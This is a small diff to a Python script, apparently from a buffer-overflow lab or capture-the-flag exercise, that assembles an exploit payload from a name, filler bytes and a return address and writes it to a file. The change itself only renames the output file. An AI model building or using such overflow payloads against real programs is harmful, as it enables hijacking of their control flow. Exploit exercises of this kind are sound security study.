@@ -5,6 +5,6 @@ name = b"Sai\n"
 
 payload = name + fill + return_address
 print (payload)
-f = open("exploit.exp", "wb")
+f = open("exploit_buffer_overflow_2.exp", "wb")
 f.write(payload)
 f.close()
